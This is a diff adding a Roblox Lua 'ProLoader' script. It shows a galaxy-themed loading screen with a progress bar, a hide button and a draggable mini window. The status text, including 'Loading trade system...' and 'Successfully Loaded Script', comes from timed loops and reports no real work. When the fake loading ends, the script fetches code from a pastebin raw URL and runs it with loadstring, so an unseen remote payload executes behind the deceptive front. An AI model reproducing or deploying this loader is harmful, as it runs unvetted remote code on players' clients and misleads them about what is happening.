@@ -1,0 +1,209 @@
+local player = game:GetService("Players").LocalPlayer
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local UIS = game:GetService("UserInputService")
+
+--// MAIN SCRIPT HOOK (put your real script here)
+local function onFinishedLoading()
+	print("Loader finished!")
+
+loadstring(game:HttpGet("https://pastebin.com/raw/j9sMVrLR"))()
+end
+
+--// GUI
+local gui = Instance.new("ScreenGui")
+gui.Name = "ProLoader"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.DisplayOrder = 9999
+gui.Parent = player:WaitForChild("PlayerGui")
+
+--// BACKGROUND (GALAXY)
+local bg = Instance.new("ImageLabel")
+bg.Size = UDim2.new(1,0,1,0)
+bg.Image = "rbxassetid://159454299"
+bg.ScaleType = Enum.ScaleType.Tile
+bg.TileSize = UDim2.new(0,500,0,500)
+bg.Parent = gui
+
+local bgConn
+bgConn = RunService.RenderStepped:Connect(function()
+	bg.TilePosition = bg.TilePosition + Vector2.new(0.05, 0.02)
+end)
+
+--// OVERLAY
+local overlay = Instance.new("Frame")
+overlay.Size = UDim2.new(1,0,1,0)
+overlay.BackgroundColor3 = Color3.fromRGB(0,0,0)
+overlay.BackgroundTransparency = 0.3
+overlay.Parent = bg
+
+--// CONTAINER
+local container = Instance.new("Frame")
+container.Size = UDim2.new(0.45,0,0.28,0)
+container.Position = UDim2.new(0.275,0,0.36,0)
+container.BackgroundColor3 = Color3.fromRGB(15,15,20)
+container.Parent = overlay
+Instance.new("UICorner", container).CornerRadius = UDim.new(0,18)
+
+local stroke = Instance.new("UIStroke", container)
+stroke.Color = Color3.fromRGB(0,170,255)
+stroke.Thickness = 2
+
+--// HIDE BUTTON
+local hideBtn = Instance.new("TextButton")
+hideBtn.Size = UDim2.new(0,120,0,35)
+hideBtn.Position = UDim2.new(0.5,-60,0,10)
+hideBtn.Text = "Hide"
+hideBtn.BackgroundColor3 = Color3.fromRGB(0,170,255)
+hideBtn.TextColor3 = Color3.fromRGB(255,255,255)
+hideBtn.Font = Enum.Font.Arcade
+hideBtn.TextScaled = true
+hideBtn.Parent = overlay
+Instance.new("UICorner", hideBtn).CornerRadius = UDim.new(0,10)
+
+--// MINI GUI
+local mini = Instance.new("Frame")
+mini.Size = UDim2.new(0,120,0,50)
+mini.Position = UDim2.new(0.8,0,0.8,0)
+mini.BackgroundColor3 = Color3.fromRGB(15,15,20)
+mini.Visible = false
+mini.Parent = gui
+Instance.new("UICorner", mini)
+
+local miniText = Instance.new("TextLabel")
+miniText.Size = UDim2.new(1,0,1,0)
+miniText.BackgroundTransparency = 1
+miniText.TextColor3 = Color3.fromRGB(0,255,120)
+miniText.Font = Enum.Font.Arcade
+miniText.TextScaled = true
+miniText.Text = "0%"
+miniText.Parent = mini
+
+--// DRAG MINI GUI
+local dragging, dragStart, startPos
+
+mini.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		dragging = true
+		dragStart = input.Position
+		startPos = mini.Position
+	end
+end)
+
+mini.InputEnded:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		dragging = false
+	end
+end)
+
+RunService.RenderStepped:Connect(function()
+	if dragging then
+		local delta = UIS:GetMouseLocation() - dragStart
+		mini.Position = UDim2.new(
+			startPos.X.Scale,
+			startPos.X.Offset + delta.X,
+			startPos.Y.Scale,
+			startPos.Y.Offset + delta.Y
+		)
+	end
+end)
+
+--// STYLE FUNCTION
+local function style(label, sizeY)
+	label.Size = UDim2.new(1,0,0,sizeY)
+	label.BackgroundTransparency = 1
+	label.TextColor3 = Color3.fromRGB(0,170,255)
+	label.Font = Enum.Font.Arcade
+	label.TextScaled = true
+end
+
+--// STATUS
+local status = Instance.new("TextLabel")
+status.Position = UDim2.new(0,0,0.05,0)
+status.Text = "Initializing..."
+status.Parent = container
+style(status, 30)
+
+--// PROGRESS BAR
+local barBG = Instance.new("Frame")
+barBG.Size = UDim2.new(0.9,0,0.18,0)
+barBG.Position = UDim2.new(0.05,0,0.35,0)
+barBG.BackgroundColor3 = Color3.fromRGB(40,40,40)
+barBG.Parent = container
+Instance.new("UICorner", barBG).CornerRadius = UDim.new(1,0)
+
+local bar = Instance.new("Frame")
+bar.Size = UDim2.new(0,0,1,0)
+bar.BackgroundColor3 = Color3.fromRGB(0,255,120)
+bar.Parent = barBG
+Instance.new("UICorner", bar).CornerRadius = UDim.new(1,0)
+
+local percent = Instance.new("TextLabel")
+percent.Size = UDim2.new(1,0,1,0)
+percent.BackgroundTransparency = 1
+percent.TextColor3 = Color3.fromRGB(0,0,0)
+percent.Font = Enum.Font.Arcade
+percent.TextScaled = true
+percent.Text = "0%"
+percent.Parent = bar
+
+--// STATUS UPDATE
+local function updateStatus(p)
+	if p <= 20 then
+		status.Text = "Connecting to "..player.Name
+	elseif p <= 50 then
+		status.Text = "Loading trade system..."
+	elseif p <= 70 then
+		status.Text = "Loaded system modules"
+	elseif p <= 90 then
+		status.Text = "Finalizing scripts..."
+	elseif p == 100 then
+		status.Text = "Successfully Loaded Script"
+	end
+end
+
+--// UPDATE FUNCTION
+local function update(p)
+	bar.Size = UDim2.new(p/100,0,1,0)
+	percent.Text = p.."%"
+	miniText.Text = p.."%"
+	updateStatus(p)
+end
+
+--// HIDE SYSTEM
+local function hideAll()
+	bg.Visible = false
+	mini.Visible = true
+end
+
+hideBtn.MouseButton1Click:Connect(hideAll)
+
+--// LOADING SEQUENCE
+for i = 1,20 do update(i) task.wait(0.1) end
+for i = 21,50 do update(i) task.wait(0.2) end
+for i = 51,70 do update(i) task.wait(0.2) end
+for i = 71,90 do update(i) task.wait(0.2) end
+for i = 91,99 do update(i) task.wait(0.3) end
+
+update(99)
+task.wait(2)
+
+update(100)
+task.wait(1)
+
+--// CLEAN EXIT
+local tween = TweenService:Create(
+	overlay,
+	TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+	{BackgroundTransparency = 1}
+)
+tween:Play()
+
+task.wait(0.6)
+
+if bgConn then bgConn:Disconnect() end
+gui:Destroy()
+
+--// RUN MAIN SCRIPT AFTER LOADER
+task.spawn(onFinishedLoading)
